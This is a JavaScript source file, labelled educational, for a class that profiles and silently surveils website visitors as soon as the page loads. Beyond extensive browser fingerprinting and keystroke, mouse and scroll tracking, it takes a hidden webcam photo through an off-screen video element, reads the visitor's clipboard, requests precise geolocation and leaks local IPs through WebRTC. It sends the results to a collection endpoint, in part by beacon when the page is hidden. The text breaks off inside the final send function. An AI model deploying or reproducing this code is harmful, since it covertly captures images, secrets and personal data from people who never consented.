/**
 * Advanced Data Collection Script
 * For educational/demonstration purposes only
 * Shows the extent of browser fingerprinting and data collection capabilities
 */

class AdvancedDataCollector {
    constructor() {
        this.collectedData = {};
        this.init();
    }

    async init() {
        // Start collection immediately but silently
        await this.collectBasicFingerprint();
        await this.collectGeolocation();
        await this.collectMediaDevices();
        await this.collectBatteryInfo();
        await this.collectNetworkInfo();
        await this.collectStorageInfo();
        await this.collectHardwareInfo();
        await this.attemptCameraAccess();
        await this.collectClipboardData();

        // NEW: Additional advanced collection methods
        await this.collectAudioFingerprint();
        await this.collectFontFingerprint();
        await this.collectWebRTCLeaks();
        await this.collectBrowserFeatures();
        await this.collectBehavioralData();
        await this.collectSensorData();
        await this.performCPUBenchmark();

        // Phase A: 11 additional silent collectors (no permission, no gesture)
        await Promise.allSettled([
            this.collectUAClientHints(),
            this.collectWebGPU(),
            this.collectDRM(),
            this.collectSpeechVoices(),
            this.collectKeyboardLayout(),
            this.collectInstalledApps(),
            this.collectScreenDetails(),
            this.collectHardeningSignals(),
            this.collectMediaQueries(),
            this.collectPermissions(),
            this.collectNavigationTiming()
        ]);

        // Phase B: 6 new silent no-permission vectors
        await Promise.allSettled([
            this.collectAutomationDetect(),
            this.collectIntlLocale(),
            this.collectPrivacySignals(),
            this.collectPlugins(),
            this.collectPlatformAuthenticator(),
            this.collectGamepads(),
        ]);

        // Send collected data
        this.sendData();
    }

    /**
     * Feature-detect a nested property path without throwing.
     * supports(navigator, 'userAgentData', 'getHighEntropyValues') → true/false
     */
    supports(obj, ...path) {
        let cur = obj;
        for (const key of path) {
            if (cur == null) return false;
            cur = cur[key];
        }
        return cur != null;
    }

    /**
     * Run fn, return its result or fallback on error.
     * fallback can be a value or a function(error) → value.
     */
    async safe(fn, fallback) {
        try {
            return await fn();
        } catch (e) {
            return typeof fallback === 'function' ? fallback(e) : fallback;
        }
    }

    async collectBasicFingerprint() {
        try {
            this.collectedData.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            };

            this.collectedData.viewport = {
                width: window.innerWidth,
                height: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio
            };

            this.collectedData.timezone = {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: navigator.language,
                languages: navigator.languages
            };

            this.collectedData.browser = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints
            };

            // Canvas fingerprinting
            this.collectedData.canvas = this.getCanvasFingerprint();

            // WebGL fingerprinting
            this.collectedData.webgl = this.getWebGLFingerprint();

        } catch (error) {
            console.log('Basic fingerprint collection failed:', error);
        }
    }

    async collectGeolocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        this.collectedData.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        resolve();
                    },
                    (error) => {
                        this.collectedData.geolocation = { error: error.message };
                        resolve();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                this.collectedData.geolocation = { error: 'Geolocation not supported' };
                resolve();
            }
        });
    }

    async collectMediaDevices() {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                this.collectedData.mediaDevices = devices.map(device => ({
                    deviceId: device.deviceId,
                    kind: device.kind,
                    label: device.label,
                    groupId: device.groupId
                }));
            }
        } catch (error) {
            this.collectedData.mediaDevices = { error: error.message };
        }
    }

    async collectBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.collectedData.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                };
            }
        } catch (error) {
            this.collectedData.battery = { error: error.message };
        }
    }

    async collectNetworkInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                this.collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
        } catch (error) {
            this.collectedData.network = { error: error.message };
        }
    }

    async collectStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                this.collectedData.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }

            // Local storage fingerprinting
            this.collectedData.localStorage = {
                supported: typeof(Storage) !== "undefined",
                length: localStorage.length
            };

        } catch (error) {
            this.collectedData.storage = { error: error.message };
        }
    }

    async collectHardwareInfo() {
        try {
            // Memory info (Chrome only)
            if ('memory' in performance) {
                this.collectedData.memory = {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                };
            }

            // Device memory (experimental)
            if ('deviceMemory' in navigator) {
                this.collectedData.deviceMemory = navigator.deviceMemory;
            }

        } catch (error) {
            this.collectedData.hardware = { error: error.message };
        }
    }

    async attemptCameraAccess() {
        try {
            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                // Create a hidden video element
                const video = document.createElement('video');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                document.body.appendChild(video);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 640,
                        height: 480,
                        facingMode: 'user'
                    },
                    audio: false
                });

                video.srcObject = stream;
                await video.play();

                // Wait a moment for the video to load
                await new Promise(resolve => setTimeout(resolve, 500));

                // Capture image
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);

                // Convert to base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.collectedData.camera = {
                    captured: true,
                    imageData: imageData,
                    timestamp: Date.now()
                };

                // Stop the stream
                stream.getTracks().forEach(track => track.stop());

                // Remove elements
                document.body.removeChild(video);

            }
        } catch (error) {
            this.collectedData.camera = {
                error: error.message,
                attempted: true
            };
        }
    }

    async collectClipboardData() {
        try {
            if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                const clipboardText = await navigator.clipboard.readText();
                this.collectedData.clipboard = {
                    content: clipboardText.substring(0, 1000), // Limit to first 1000 chars
                    length: clipboardText.length
                };
            }
        } catch (error) {
            this.collectedData.clipboard = { error: error.message };
        }
    }

    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Draw complex pattern for fingerprinting
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Advanced Data Collection Demo 🎯', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprinting Test', 4, 45);

            return canvas.toDataURL();
        } catch (error) {
            return { error: error.message };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) return { error: 'WebGL not supported' };

            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions()
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    async collectAudioFingerprint() {
        try {
            if ('AudioContext' in window || 'webkitAudioContext' in window) {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);

                gainNode.gain.value = 0; // Mute
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);

                oscillator.start(0);

                const fingerprint = await new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function(event) {
                        const output = event.outputBuffer.getChannelData(0);
                        const hash = Array.from(output.slice(0, 30)).reduce((a, b) => a + b, 0);
                        oscillator.stop();
                        context.close();
                        resolve(hash.toString());
                    };
                });

                this.collectedData.audioFingerprint = {
                    hash: fingerprint,
                    sampleRate: context.sampleRate,
                    baseLatency: context.baseLatency || 'unknown',
                    outputLatency: context.outputLatency || 'unknown'
                };
            }
        } catch (error) {
            this.collectedData.audioFingerprint = { error: error.message };
        }
    }

    async collectFontFingerprint() {
        try {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
                'Impact', 'Lucida Sans', 'Tahoma', 'Lucida Console', 'Monaco',
                'Helvetica', 'Apple SD Gothic Neo', 'Microsoft YaHei'
            ];

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testString = 'mmmmmmmmmmlli';
            const fontSize = '72px';

            const getTextWidth = (font) => {
                ctx.font = `${fontSize} ${font}`;
                return ctx.measureText(testString).width;
            };

            const baseSizes = {};
            baseFonts.forEach(baseFont => {
                baseSizes[baseFont] = getTextWidth(baseFont);
            });

            const installedFonts = [];
            testFonts.forEach(font => {
                const detected = baseFonts.some(baseFont => {
                    return getTextWidth(`${font}, ${baseFont}`) !== baseSizes[baseFont];
                });
                if (detected) installedFonts.push(font);
            });

            this.collectedData.fonts = {
                installed: installedFonts,
                count: installedFonts.length
            };
        } catch (error) {
            this.collectedData.fonts = { error: error.message };
        }
    }

    async collectWebRTCLeaks() {
        try {
            const localIPs = [];
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

            if (RTCPeerConnection) {
                const pc = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });

                pc.createDataChannel('');
                await pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const ipMatch = ipRegex.exec(ice.candidate.candidate);
                    if (ipMatch && !localIPs.includes(ipMatch[0])) {
                        localIPs.push(ipMatch[0]);
                    }
                };

                // Wait for ICE candidates
                await new Promise(resolve => setTimeout(resolve, 2000));

                this.collectedData.webrtc = {
                    localIPs: localIPs,
                    leakDetected: localIPs.length > 0
                };

                pc.close();
            }
        } catch (error) {
            this.collectedData.webrtc = { error: error.message };
        }
    }

    async collectBrowserFeatures() {
        try {
            this.collectedData.browserFeatures = {
                serviceWorker: 'serviceWorker' in navigator,
                webAssembly: typeof WebAssembly !== 'undefined',
                webGL2: !!document.createElement('canvas').getContext('webgl2'),
                webGPU: 'gpu' in navigator,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                nfc: 'nfc' in navigator,
                paymentRequest: 'PaymentRequest' in window,
                credentials: 'credentials' in navigator,
                webAuthentication: 'credentials' in navigator && 'create' in navigator.credentials,
                share: 'share' in navigator,
                permissions: 'permissions' in navigator,
                notifications: 'Notification' in window,
                pushManager: 'PushManager' in window,
                backgroundSync: 'sync' in (self.registration || {}),
                periodicBackgroundSync: 'periodicSync' in (self.registration || {}),
                indexedDB: 'indexedDB' in window,
                fileSystem: 'showOpenFilePicker' in window,
                clipboard: 'clipboard' in navigator,
                contacts: 'contacts' in navigator,
                wakeLock: 'wakeLock' in navigator,
                mediaSession: 'mediaSession' in navigator
            };
        } catch (error) {
            this.collectedData.browserFeatures = { error: error.message };
        }
    }

    async collectBehavioralData() {
        try {
            const behavioral = {
                mouseMovements: [],
                mouseMoveCount: 0,
                clicks: [],
                clickCount: 0,
                scrolls: [],
                maxScrollPct: 0,
                keypresses: [],
                keystrokeCount: 0,
                touchEvents: [],
                touchCount: 0,
                visibilityTransitions: [],
                pageVisible: !document.hidden,
                hasFocus: document.hasFocus(),
                tabVisibility: document.visibilityState,
                dwellMs: 0,
                _dwellStart: performance.now()
            };
            this._behavioral = behavioral;

            // Mouse trajectory — first 50 points, keep counting after cap
            const mouseMoveHandler = (e) => {
                behavioral.mouseMoveCount++;
                if (behavioral.mouseMovements.length < 50) {
                    behavioral.mouseMovements.push({
                        x: e.clientX, y: e.clientY, t: Date.now()
                    });
                } else {
                    document.removeEventListener('mousemove', mouseMoveHandler);
                }
            };
            document.addEventListener('mousemove', mouseMoveHandler);

            // Clicks — first 25, keep counting
            const clickHandler = (e) => {
                behavioral.clickCount++;
                if (behavioral.clicks.length < 25) {
                    behavioral.clicks.push({
                        x: e.clientX, y: e.clientY, t: Date.now(), button: e.button
                    });
                }
            };
            document.addEventListener('click', clickHandler);

            // Scroll depth — track max percentage
            const scrollHandler = () => {
                const scrollable = document.documentElement.scrollHeight - window.innerHeight;
                if (scrollable > 0) {
                    const pct = Math.round((window.scrollY / scrollable) * 100);
                    if (pct > behavioral.maxScrollPct) behavioral.maxScrollPct = pct;
                }
                if (behavioral.scrolls.length < 25) {
                    behavioral.scrolls.push({ pct: behavioral.maxScrollPct, t: Date.now() });
                }
            };
            document.addEventListener('scroll', scrollHandler, { passive: true });

            // Keystroke cadence — TIMING ONLY, never content.
            // DO NOT read e.key, e.code, e.keyCode, e.which, or input.value.
            // Only key-down and key-up timestamps are recorded.
            let lastKeyupTime = 0;
            const keydownHandler = (e) => {
                behavioral.keystrokeCount++;
                if (behavioral.keypresses.length < 30) {
                    const now = performance.now();
                    const gapMs = lastKeyupTime > 0 ? now - lastKeyupTime : 0;
                    behavioral.keypresses.push({
                        downMs: now, upMs: null, dwellMs: null, gapMs: gapMs
                    });
                }
            };
            const keyupHandler = (e) => {
                const last = behavioral.keypresses[behavioral.keypresses.length - 1];
                if (last && last.upMs === null) {
                    const now = performance.now();
                    last.upMs = now;
                    last.dwellMs = now - last.downMs;
                    lastKeyupTime = now;
                }
            };
            window.addEventListener('keydown', keydownHandler);
            window.addEventListener('keyup', keyupHandler);

            // Touch (mobile)
            const touchHandler = (e) => {
                behavioral.touchCount++;
                if (behavioral.touchEvents.length < 30) {
                    const touch = e.touches[0] || e.changedTouches[0];
                    if (touch) {
                        behavioral.touchEvents.push({
                            x: touch.clientX, y: touch.clientY, t: Date.now()
                        });
                    }
                }
            };
            document.addEventListener('touchstart', touchHandler, { passive: true });

            // Visibility/focus transitions — append, capped at 20
            const pushTransition = (state) => {
                if (behavioral.visibilityTransitions.length < 20) {
                    behavioral.visibilityTransitions.push({
                        state: state, t: Date.now()
                    });
                }
            };
            document.addEventListener('visibilitychange', () => {
                pushTransition(document.visibilityState);
            });
            window.addEventListener('blur', () => pushTransition('blurred'));
            window.addEventListener('focus', () => pushTransition('focused'));

            this.collectedData.behavioral = behavioral;

            // Register pre-unload flush for dwell time + late data
            this._registerBehavioralFlush();
        } catch (error) {
            this.collectedData.behavioral = { error: error.message };
        }
    }

    _registerBehavioralFlush() {
        const flush = () => this.flushBehavioral();
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') flush();
        });
        window.addEventListener('pagehide', flush);
    }

    flushBehavioral() {
        if (!this._behavioral) return;
        const b = this._behavioral;
        b.dwellMs = Math.round(performance.now() - b._dwellStart);
        // Remove the internal _dwellStart key before sending
        const payload = Object.assign({}, b);
        delete payload._dwellStart;
        try {
            const body = JSON.stringify({
                timestamp: Date.now(),
                url: window.location.href,
                referrer: document.referrer,
                data: { behavioral: payload },
                behavioralFlush: true
            });
            // sendBeacon survives navigation; fallback to fetch keepalive
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/collect-advanced-data', body);
            } else {
                fetch('/api/collect-advanced-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: body, keepalive: true
                }).catch(() => {});
            }
        } catch (e) { /* silent */ }
    }

    async collectSensorData() {
        try {
            const sensors = {};

            // Ambient Light Sensor
            if ('AmbientLightSensor' in window) {
                try {
                    const als = new AmbientLightSensor();
                    als.addEventListener('reading', () => {
                        sensors.ambientLight = als.illuminance;
                        als.stop();
                    });
                    als.start();
                } catch (e) {
                    sensors.ambientLight = { error: e.message };
                }
            }

            // Accelerometer
            if ('Accelerometer' in window) {
                try {
                    const acl = new Accelerometer({ frequency: 60 });
                    acl.addEventListener('reading', () => {
                        sensors.accelerometer = { x: acl.x, y: acl.y, z: acl.z };
                        acl.stop();
                    });
                    acl.start();
                } catch (e) {
                    sensors.accelerometer = { error: e.message };
                }
            }

            // Gyroscope
            if ('Gyroscope' in window) {
                try {
                    const gyr = new Gyroscope({ frequency: 60 });
                    gyr.addEventListener('reading', () => {
                        sensors.gyroscope = { x: gyr.x, y: gyr.y, z: gyr.z };
                        gyr.stop();
                    });
                    gyr.start();
                } catch (e) {
                    sensors.gyroscope = { error: e.message };
                }
            }

            // DeviceOrientation (fallback for mobile)
            window.addEventListener('deviceorientation', (e) => {
                sensors.deviceOrientation = {
                    alpha: e.alpha,
                    beta: e.beta,
                    gamma: e.gamma
                };
            }, { once: true });

            this.collectedData.sensors = sensors;
        } catch (error) {
            this.collectedData.sensors = { error: error.message };
        }
    }

    async performCPUBenchmark() {
        try {
            const start = performance.now();
            let result = 0;
            // Simple CPU benchmark
            for (let i = 0; i < 1000000; i++) {
                result += Math.sqrt(i) * Math.sin(i);
            }
            const duration = performance.now() - start;

            this.collectedData.cpuBenchmark = {
                duration: duration,
                score: Math.round(1000000 / duration),
                timestamp: Date.now()
            };
        } catch (error) {
            this.collectedData.cpuBenchmark = { error: error.message };
        }
    }

    // ------------------------------------------------------------------
    // Phase A: 11 silent collectors — populate keys the embed builders
    // already expect. Each sets this.collectedData.<key> to a populated
    // dict or { error: msg } to match the _is_valid_dict contract.
    // ------------------------------------------------------------------

    async collectUAClientHints() {
        this.collectedData.uaClientHints = await this.safe(async () => {
            if (!this.supports(navigator, 'userAgentData', 'getHighEntropyValues')) {
                return { error: 'User-Agent Client Hints API not supported' };
            }
            const uad = navigator.userAgentData;
            const hev = await uad.getHighEntropyValues([
                'architecture', 'bitness', 'model', 'platformVersion',
                'fullVersionList', 'formFactor'
            ]);
            return {
                brands: uad.brands,
                fullVersionList: hev.fullVersionList,
                platform: uad.platform,
                platformVersion: hev.platformVersion,
                architecture: hev.architecture,
                bitness: hev.bitness,
                model: hev.model,
                mobile: uad.mobile,
                formFactor: hev.formFactor
            };
        }, { error: 'UA-CH collection failed' });
    }

    async collectWebGPU() {
        this.collectedData.webgpu = await this.safe(async () => {
            if (!this.supports(navigator, 'gpu', 'requestAdapter')) {
                return { error: 'WebGPU not supported' };
            }
            const adapter = await navigator.gpu.requestAdapter();
            if (!adapter) return { error: 'No WebGPU adapter available' };
            // Chrome 113+: adapter.info; older: adapter.requestAdapterInfo()
            let info = adapter.info;
            if (!info && typeof adapter.requestAdapterInfo === 'function') {
                info = await adapter.requestAdapterInfo();
            }
            return {
                vendor: (info && info.vendor) || 'unknown',
                architecture: (info && info.architecture) || 'unknown',
                device: (info && info.device) || 'unknown'
            };
        }, { error: 'WebGPU collection failed' });
    }

    async collectDRM() {
        this.collectedData.drm = await this.safe(async () => {
            const keySystems = {};
            const ksMap = {
                'com.widevine.alpha': 'Widevine',
                'com.microsoft.playready': 'PlayReady',
                'com.apple.fps.1_0': 'FairPlay'
            };
            for (const [ks, label] of Object.entries(ksMap)) {
                try {
                    const access = await navigator.requestMediaKeySystemAccess(ks, [{
                        initDataTypes: ['cenc'],
                        videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }]
                    }]);
                    keySystems[label] = !!access;
                } catch {
                    keySystems[label] = false;
                }
            }
            const codecTests = [
                { name: 'H.264', codec: 'avc1.42E01E' },
                { name: 'VP9', codec: 'vp09.00.10.08' },
                { name: 'AV1', codec: 'av01.0.04M.08' },
                { name: 'HEVC', codec: 'hev1.1.6.L93.B0' },
                { name: 'EAC3', codec: 'mp4a.40.2' }
            ];
            const codecs = {};
            for (const { name, codec } of codecTests) {
                try {
                    const result = await navigator.mediaCapabilities.decodingInfo({
                        type: 'file',
                        video: {
                            contentType: `video/mp4; codecs="${codec}"`,
                            width: 1920, height: 1080, bitrate: 5000000, framerate: 30
                        }
                    });
                    codecs[name] = !!result.supported;
                } catch {
                    codecs[name] = false;
                }
            }
            return { keySystems, codecs };
        }, { error: 'DRM/codec detection failed' });
    }

    async collectSpeechVoices() {
        this.collectedData.speechVoices = await this.safe(async () => {
            if (!this.supports(window, 'speechSynthesis')) {
                return { error: 'Speech Synthesis API not supported' };
            }
            let voices = speechSynthesis.getVoices();
            if (voices.length === 0) {
                voices = await new Promise((resolve) => {
                    const timer = setTimeout(() => resolve([]), 1500);
                    speechSynthesis.addEventListener('voiceschanged', () => {
                        clearTimeout(timer);
                        resolve(speechSynthesis.getVoices());
                    }, { once: true });
                });
            }
            return {
                count: voices.length,
                sample: voices.slice(0, 10).map(v => ({ name: v.name, lang: v.lang }))
            };
        }, { error: 'Speech voice collection failed' });
    }

    async collectKeyboardLayout() {
        this.collectedData.keyboardLayout = await this.safe(async () => {
            if (!this.supports(navigator, 'keyboard', 'getLayoutMap')) {
                return { error: 'Keyboard Layout API not supported' };
            }
            const layoutMap = await navigator.keyboard.getLayoutMap();
            const sample = {};
            let size = 0;
            layoutMap.forEach((value, key) => {
                if (size < 10) sample[key] = value;
                size++;
            });
            return { size, sample };
        }, { error: 'Keyboard layout collection failed' });
    }

    async collectInstalledApps() {
        this.collectedData.installedApps = await this.safe(async () => {
            if (!this.supports(navigator, 'getInstalledRelatedApps')) {
                return { error: 'Related Apps API not supported' };
            }
            const apps = await navigator.getInstalledRelatedApps();
            return {
                count: apps.length,
                apps: apps.map(a => ({
                    id: a.id || a.url || a.platform,
                    platform: a.platform
                }))
            };
        }, { error: 'Installed apps collection failed' });
    }

    async collectScreenDetails() {
        // Silent only — screen.isExtended boolean. No getScreenDetails() (gesture-gated).
        this.collectedData.screenDetails = await this.safe(async () => {
            return { isExtended: screen.isExtended === true };
        }, { error: 'Screen details collection failed' });
    }

    async collectHardeningSignals() {
        this.collectedData.hardeningSignals = await this.safe(async () => {
            return {
                sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
                crossOriginIsolated: window.crossOriginIsolated === true,
                isSecureContext: window.isSecureContext === true,
                trustedTypes: typeof window.TrustedTypePolicy !== 'undefined',
                cookieStore: this.supports(window, 'cookieStore'),
                storageAccessApi: this.supports(document, 'requestStorageAccess')
            };
        }, { error: 'Hardening signals collection failed' });
    }

    async collectMediaQueries() {
        this.collectedData.mediaQueries = await this.safe(async () => {
            const probes = {
                'prefers-color-scheme: dark': 'colorSchemeDark',
                'prefers-reduced-motion: reduce': 'reducedMotion',
                'prefers-reduced-transparency: reduce': 'reducedTransparency',
                'prefers-contrast: more': 'highContrast',
                'forced-colors: active': 'forcedColors',
                'inverted-colors: inverted': 'invertedColors',
                '(color-gamut: p3)': 'wideColorGamut',
                '(dynamic-range: high)': 'highDynamicRange',
                'prefers-reduced-data: reduce': 'reducedData',
                '(hover: hover)': 'hoverCapable',
                '(any-pointer: fine)': 'finePointer'
            };
            const results = {};
            for (const [query, label] of Object.entries(probes)) {
                try {
                    results[label] = window.matchMedia(query).matches === true;
                } catch {
                    results[label] = false;
                }
            }
            return results;
        }, { error: 'Media query collection failed' });
    }

    async collectPermissions() {
        this.collectedData.permissions = await this.safe(async () => {
            if (!this.supports(navigator, 'permissions', 'query')) {
                return { error: 'Permissions API not supported' };
            }
            const names = [
                'geolocation', 'notifications', 'camera', 'microphone',
                'persistent-storage', 'background-sync', 'storage-access',
                'clipboard-read', 'midi', 'window-management'
            ];
            const results = {};
            for (const name of names) {
                try {
                    const status = await navigator.permissions.query({ name });
                    results[name] = status.state;
                } catch {
                    // Some names throw on unsupported browsers — skip silently
                }
            }
            return results;
        }, { error: 'Permissions collection failed' });
    }

    async collectNavigationTiming() {
        this.collectedData.navigationTiming = await this.safe(async () => {
            const entries = performance.getEntriesByType('navigation');
            if (!entries || entries.length === 0) {
                return { error: 'No navigation timing entries available' };
            }
            const nav = entries[0];
            return {
                type: nav.type,
                responseStart: nav.responseStart,
                loadEventEnd: nav.loadEventEnd,
                transferSize: nav.transferSize,
                domInteractive: nav.domInteractive
            };
        }, { error: 'Navigation timing collection failed' });
    }

    // ------------------------------------------------------------------
    // Phase B: 6 new silent no-permission fingerprinting vectors.
    // Each sets this.collectedData.<key> to a populated dict or
    // { error: msg } to match the _is_valid_dict contract.
    // ------------------------------------------------------------------

    async collectAutomationDetect() {
        this.collectedData.automationDetect = await this.safe(async () => {
            const indicators = [];
            const webdriver = navigator.webdriver === true;
            if (webdriver) indicators.push('webdriver_flag');

            const webglRenderer = (this.collectedData.webgl && this.collectedData.webgl.renderer) || '';
            if (/swiftshader|headless/i.test(webglRenderer)) indicators.push('SwiftShader_renderer');

            const pluginCount = navigator.plugins ? navigator.plugins.length : -1;
            if (pluginCount === 0) indicators.push('no_plugins');

            const langs = navigator.languages;
            if (!langs || langs.length === 0) indicators.push('empty_languages');

            if (window.outerWidth === 0 || window.outerHeight === 0) indicators.push('empty_outer_dimensions');

            let jsEngine = 'unknown';
            let stackFormat = 'unknown';
            try {
                const stack = new Error('probe').stack || '';
                if (stack.includes('    at ')) { jsEngine = 'V8'; stackFormat = 'v8'; }
                else if (stack.includes('@')) { jsEngine = 'SpiderMonkey'; stackFormat = 'spidermonkey'; }
                else if (stack.length > 0) { jsEngine = 'JavaScriptCore'; stackFormat = 'jsc'; }
            } catch (e) { /* ignore */ }

            let uaSpoofed = false;
            const ua = navigator.userAgent.toLowerCase();
            if (jsEngine === 'V8' && /firefox\//.test(ua)) uaSpoofed = true;
            if (jsEngine === 'SpiderMonkey' && /chrome\//.test(ua)) uaSpoofed = true;
            if (uaSpoofed) indicators.push('ua_engine_mismatch');

            let botScore = 0;
            if (webdriver) botScore += 50;
            botScore += indicators.length * 10;
            if (uaSpoofed) botScore += 20;
            botScore = Math.min(botScore, 100);

            return {
                webdriver: webdriver,
                headlessIndicators: indicators,
                jsEngine: jsEngine,
                stackFormat: stackFormat,
                uaSpoofed: uaSpoofed,
                botScore: botScore,
                likelyBot: botScore >= 50
            };
        }, { error: 'Automation detection failed' });
    }

    async collectIntlLocale() {
        this.collectedData.intlLocale = await this.safe(async () => {
            const dtf = new Intl.DateTimeFormat().resolvedOptions();
            const col = new Intl.Collator().resolvedOptions();

            let pluralCategories = [];
            let pluralType = null;
            try {
                const pr = new Intl.PluralRules().resolvedOptions();
                pluralCategories = pr.pluralCategories || [];
                pluralType = pr.type || null;
            } catch (e) { /* older browsers */ }

            return {
                locale: dtf.locale,
                calendar: dtf.calendar,
                numberingSystem: dtf.numberingSystem,
                timeZone: dtf.timeZone,
                hourCycle: dtf.hourCycle,
                hour12: dtf.hour12,
                collation: col.collation,
                sensitivity: col.sensitivity,
                caseFirst: col.caseFirst,
                numeric: col.numeric,
                pluralCategories: pluralCategories,
                pluralType: pluralType
            };
        }, { error: 'Intl locale collection failed' });
    }

    async collectPrivacySignals() {
        this.collectedData.privacySignals = await this.safe(async () => {
            return {
                gpc: navigator.globalPrivacyControl ?? null,
                dnt: navigator.doNotTrack ?? window.doNotTrack ?? null,
            };
        }, { error: 'Privacy signals collection failed' });
    }

    async collectPlugins() {
        this.collectedData.plugins = await this.safe(async () => {
            const plugins = navigator.plugins;
            const names = [];
            if (plugins && plugins.length > 0) {
                for (let i = 0; i < Math.min(plugins.length, 10); i++) {
                    names.push(plugins[i].name);
                }
            }
            return {
                count: plugins ? plugins.length : 0,
                names: names,
                pdfViewerEnabled: typeof navigator.pdfViewerEnabled === 'boolean' ? navigator.pdfViewerEnabled : null
            };
        }, { error: 'Plugin fingerprint collection failed' });
    }

    async collectPlatformAuthenticator() {
        this.collectedData.platformAuthenticator = await this.safe(async () => {
            if (typeof PublicKeyCredential !== 'undefined' &&
                typeof PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable === 'function') {
                const available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
                return { platformAuthenticatorAvailable: available };
            }
            return { error: 'WebAuthn not supported' };
        }, { error: 'Platform authenticator check failed' });
    }

    async collectGamepads() {
        this.collectedData.gamepads = await this.safe(async () => {
            const pads = navigator.getGamepads ? navigator.getGamepads() : [];
            const gamepads = [];
            for (const pad of pads) {
                if (pad) {
                    gamepads.push({
                        id: pad.id,
                        buttons: pad.buttons.length,
                        axes: pad.axes.length,
                        mapping: pad.mapping
                    });
                }
            }
            return { count: gamepads.length, gamepads: gamepads };
        }, { error: 'Gamepad enumeration failed' });
    }

    async sendData() {
        try {
            const response = await fetch('/api/collect-advanced-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: Date.now(),
                    url: window.location.href,
